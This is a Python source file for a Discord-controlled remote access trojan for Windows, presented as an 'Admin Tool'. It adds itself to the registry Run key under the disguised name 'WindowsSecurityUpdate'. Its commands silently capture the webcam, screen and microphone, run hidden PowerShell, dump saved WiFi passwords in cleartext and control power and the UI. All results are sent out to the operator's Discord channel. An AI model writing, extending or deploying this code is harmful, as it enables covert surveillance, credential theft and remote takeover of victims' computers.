import discord
from discord.ext import commands, tasks
import os
import subprocess
import socket
import asyncio
import psutil
import platform
import shutil
import zipfile
import requests
import cv2
import sounddevice as sd
from scipy.io import wavfile
from PIL import ImageGrab
import pathlib
import sys
import time
import ctypes
import winreg
import win32gui
import win32con
import win32api
import pyttsx3
import wmi
import json
import re
from dotenv import load_dotenv

# --- Load Environment Variables ---
load_dotenv()

# --- Configuration ---
TOKEN = os.getenv('DISCORD_TOKEN')
try:
    GUILD_ID = int(os.getenv('GUILD_ID'))
except (TypeError, ValueError):
    GUILD_ID = 0
    
PATH_FILE = 'path.txt'
STARTUP_NAME = "WindowsSecurityUpdate"

# --- Advanced Utilities ---
class AdminBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents, help_command=None)
        self.hostname = socket.gethostname()
        self.main_channel = None
        self.already_ready = False

    async def setup_hook(self):
        self.heartbeat.start()

    @tasks.loop(minutes=10)
    async def heartbeat(self):
        if self.main_channel:
            await self.main_channel.send(f"💓 **Heartbeat:** Host `{self.hostname}` is active. Path: `{os.getcwd()}`")

# --- Initial Setup & Persistence ---
def check_single_instance():
    current_pid = os.getpid()
    script_name = os.path.basename(sys.argv[0])
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            if proc.info['pid'] == current_pid: continue
            cmdline = proc.info.get('cmdline')
            if cmdline and any(script_name in arg for arg in cmdline):
                print(f"Another instance is already running (PID: {proc.info['pid']}). Exiting.")
                sys.exit(0)
        except (psutil.NoSuchProcess, psutil.AccessDenied, TypeError):
            continue

def add_to_persistence():
    try:
        app_path = os.path.realpath(sys.argv[0])
        # Registry Persistence
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, STARTUP_NAME, 0, winreg.REG_SZ, f'"{app_path}"')
    except:
        pass

def get_working_dir():
    if os.path.exists(PATH_FILE):
        with open(PATH_FILE, 'r') as f:
            saved_path = f.read().strip()
            if os.path.isdir(saved_path):
                os.chdir(saved_path)
                return
    os.chdir(str(pathlib.Path.home()))

# --- The Bot Instance ---
bot = AdminBot()

# --- 1. System Info & Recon ---
@bot.command()
async def sysinfo(ctx):
    """Detailed System Reconnaissance."""
    try:
        public_ip = requests.get('https://api.ipify.org').text
        local_ip = socket.gethostbyname(bot.hostname)
        mac = ':'.join(re.findall('..', '%012x' % win32api.GetNetbiosAncillaryName()[1])) # Simplified MAC
        
        c = wmi.WMI()
        gpu = [g.Name for g in c.Win32_VideoController()]
        cpu = platform.processor()
        ram = f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB"
        
        info = (
            f"💻 **Host:** `{bot.hostname}`\n"
            f"🌐 **Public IP:** `{public_ip}`\n"
            f"🏠 **Local IP:** `{local_ip}`\n"
            f"⚙️ **OS:** `{platform.system()} {platform.release()}`\n"
            f"🧠 **CPU:** `{cpu}`\n"
            f"🎨 **GPU:** `{', '.join(gpu)}`\n"
            f"🐏 **RAM:** `{ram}`"
        )
        await ctx.send(info)
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

# --- 2. Media Capture (Webcam, Screen, Audio) ---
@bot.command()
async def webcam(ctx):
    """Silent Webcam Capture."""
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        await ctx.send("❌ No webcam found.")
        return
    ret, frame = cap.read()
    if ret:
        cv2.imwrite("webcam.jpg", frame)
        await ctx.send(file=discord.File("webcam.jpg"))
        os.remove("webcam.jpg")
    cap.release()

@bot.command()
async def ss(ctx):
    """Multi-monitor Screenshot."""
    img = ImageGrab.grab(all_screens=True)
    img.save("ss.png")
    await ctx.send(file=discord.File("ss.png"))
    os.remove("ss.png")

@bot.command()
async def audio(ctx, sec: int = 5):
    """Hi-Fi Audio Recording."""
    fs = 44100
    rec = sd.rec(int(sec * fs), samplerate=fs, channels=2, dtype='int16')
    sd.wait()
    wavfile.write("rec.wav", fs, rec)
    await ctx.send(file=discord.File("rec.wav"))
    os.remove("rec.wav")

# --- 3. Shell & File Management ---
@bot.command()
async def shell(ctx, *, cmd: str):
    """PowerShell execution with Persistence compatibility."""
    # Handle CD manually
    if cmd.lower().startswith("cd "):
        try:
            path = cmd[3:].strip().strip('"')
            os.chdir(os.path.abspath(path))
            with open(PATH_FILE, 'w') as f: f.write(os.getcwd())
            await ctx.send(f"📂 Switched to: `{os.getcwd()}`")
            return
        except Exception as e:
            await ctx.send(f"❌ CD Error: {e}")
            return

    try:
        proc = subprocess.Popen(["powershell", "-Command", cmd], stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW, text=True)
        out, err = proc.communicate(timeout=60)
        res = (out + err).strip()
        
        if len(res) > 1900 or cmd.lower() in ['ls', 'dir', 'tasklist']:
            with open("out.txt", "w", encoding="utf-8") as f: f.write(res)
            await ctx.send(file=discord.File("out.txt"))
            os.remove("out.txt")
        elif res:
            await ctx.send(f"```\n{res}\n```")
        else:
            await ctx.send("✅ Command executed.")
    except Exception as e:
        await ctx.send(f"❌ Shell Error: {e}")

@bot.command()
async def search(ctx, directory: str, filename: str):
    """Recursive File Search."""
    results = []
    for root, dirs, files in os.walk(directory):
        if filename in files:
            results.append(os.path.join(root, filename))
    if results:
        msg = "\n".join(results[:10])
        await ctx.send(f"🔍 Found:\n`{msg}`")
    else:
        await ctx.send("❌ No matches.")

# --- 4. Browser & Identity Recon ---
@bot.command()
async def wifi(ctx):
    """Recover Saved WiFi Profiles (Cleartext)."""
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8', errors="backslashreplace")
        profiles = [i.split(":")[1][1:-1] for i in data.split('\n') if "All User Profile" in i]
        result = ""
        for i in profiles:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'], creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8', errors="backslashreplace")
                results = [b.split(":")[1][1:-1] for b in results.split('\n') if "Key Content" in b]
                result += f"SSID: {i} | PASS: {results[0] if results else 'None'}\n"
            except: continue
        
        with open("wifi.txt", "w") as f: f.write(result)
        await ctx.send(file=discord.File("wifi.txt"))
        os.remove("wifi.txt")
    except Exception as e: await ctx.send(f"❌ Error: {e}")

# --- 5. Power & UI Control ---
@bot.command()
async def power(ctx, action: str):
    """shutdown, restart, logout, lock."""
    actions = {
        "shutdown": "shutdown /s /t 0",
        "restart": "shutdown /r /t 0",
        "logout": "shutdown /l",
        "lock": "rundll32.exe user32.dll,LockWorkStation"
    }
    if action in actions:
        await ctx.send(f"⚠️ Executing {action}...")
        subprocess.run(actions[action], shell=True)
    else:
        await ctx.send("Options: shutdown, restart, logout, lock")

@bot.command()
async def taskbar(ctx, toggle: str):
    """hide / show taskbar."""
    hWnd = win32gui.FindWindow("Shell_TrayWnd", None)
    if toggle == "hide":
        win32gui.ShowWindow(hWnd, win32con.SW_HIDE)
    else:
        win32gui.ShowWindow(hWnd, win32con.SW_SHOW)
    await ctx.send(f"✅ Taskbar {toggle}ed.")

# --- 6. Interaction ---
@bot.command()
async def msg(ctx, *, text: str):
    """Displays a Windows Message Box."""
    ctypes.windll.user32.MessageBoxW(0, text, "System Notification", 1)
    await ctx.send("✅ Message displayed.")

@bot.command()
async def tts(ctx, *, text: str):
    """Text-to-Speech interaction."""
    engine = pyttsx3.init()
    engine.say(text)
    engine.runAndWait()
    await ctx.send("✅ TTS completed.")

# --- 7. Discord Integration & Housekeeping ---
@bot.command()
async def clear(ctx, amount: int = 100):
    """Purge channel messages."""
    await ctx.channel.purge(limit=amount)

@bot.command()
async def help(ctx):
    """Paginated High-Level Help."""
    embed = discord.Embed(title="🔧 Admin Tool Commands", color=0x2f3136)
    embed.add_field(name="🌐 Recon", value="`!sysinfo`, `!wifi`", inline=True)
    embed.add_field(name="📸 Media", value="`!webcam`, `!ss`, `!audio`", inline=True)
    embed.add_field(name="📁 Files", value="`!shell`, `!search` [dir] [file]", inline=True)
    embed.add_field(name="🔋 Power", value="`!power` [type], `!lock`", inline=True)
    embed.add_field(name="🎭 UI/Interact", value="`!msg` [txt], `!tts` [txt], `!taskbar` [on/off]", inline=True)
    await ctx.send(embed=embed)

@bot.event
async def on_ready():
    if bot.already_ready:
        return
    bot.already_ready = True
    
    guild = bot.get_guild(GUILD_ID)
    if guild:
        name = bot.hostname.lower().replace(" ", "-")
        channel = discord.utils.get(guild.text_channels, name=name)
        if not channel:
            channel = await guild.create_text_channel(name)
        bot.main_channel = channel
        await channel.send(f"🛸 **System Online:** `{bot.hostname}`\nActive in `{os.getcwd()}`")

# --- Run ---
if __name__ == '__main__':
    if not TOKEN or not GUILD_ID:
        print("❌ Error: DISCORD_TOKEN or GUILD_ID not found in .env file.")
        sys.exit(1)
        
    check_single_instance()
    add_to_persistence()
    get_working_dir()
    bot.run(TOKEN)
